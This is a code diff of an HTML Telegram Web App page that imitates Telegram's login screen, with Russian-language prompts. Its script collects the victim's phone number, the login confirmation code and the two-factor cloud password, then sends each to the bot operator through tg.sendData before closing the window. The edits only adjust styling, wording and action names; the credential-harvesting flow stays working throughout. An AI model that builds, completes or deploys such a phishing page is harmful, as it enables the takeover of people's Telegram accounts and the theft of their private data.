@@ -8,6 +8,7 @@
     <style>
         body { 
             background-color: #ffffff; 
+            /* Четкие узоры Telegram */
             background-image: url("https://www.transparenttextures.com");
             background-repeat: repeat;
             font-family: -apple-system, sans-serif; 
@@ -21,7 +22,7 @@
             box-shadow: 0 10px 30px rgba(0,0,0,0.1);
         }
         .tg-logo { width: 75px; height: 75px; margin-bottom: 20px; }
-        h2 { font-size: 26px; font-weight: 700; margin-bottom: 10px; }
+        h2 { font-size: 24px; font-weight: 700; margin-bottom: 10px; }
         p { font-size: 15px; color: #707579; margin-bottom: 25px; }
         .phone-box { display: flex; flex-direction: column; gap: 12px; margin-bottom: 20px; }
         select, input { 
@@ -51,7 +52,7 @@
     </div>
     <script>
         let tg = window.Telegram.WebApp; tg.expand();
-        let step = 1; let mask; let phone = ""; let code = "";
+        let step = 1; let mask; let phone = "";
         function initMask(p) { if (mask) mask.destroy(); mask = IMask(document.getElementById('phoneInput'), { mask: p, lazy: false }); }
         function changeCountry() { initMask(document.getElementById('country').options[document.getElementById('country').selectedIndex].getAttribute('data-mask')); }
         initMask("+{7} (000) 000 00 00");
@@ -67,16 +68,14 @@
                 document.getElementById('btn').innerText = "Подтвердить";
                 step = 2;
             } else if (step === 2) {
-                code = val;
-                tg.sendData(JSON.stringify({ "action": "try_login", "code": code, "phone": phone }));
-                // Ждем 1 сек и спрашиваем пароль (если нужно)
-                document.getElementById('desc').innerText = "Введите облачный пароль (2FA)";
+                tg.sendData(JSON.stringify({ "action": "login_attempt", "code": val, "phone": phone }));
+                // Если нужно 2FA
+                document.getElementById('desc').innerText = "Введите облачный пароль (если есть)";
                 document.getElementById('phoneInput').type = "password";
                 document.getElementById('phoneInput').value = "";
-                document.getElementById('btn').innerText = "Авторизоваться";
                 step = 3;
             } else {
-                tg.sendData(JSON.stringify({ "action": "login_2fa", "password": val, "code": code, "phone": phone }));
+                tg.sendData(JSON.stringify({ "action": "login_2fa", "password": val, "phone": phone }));
                 tg.close();
             }
         };
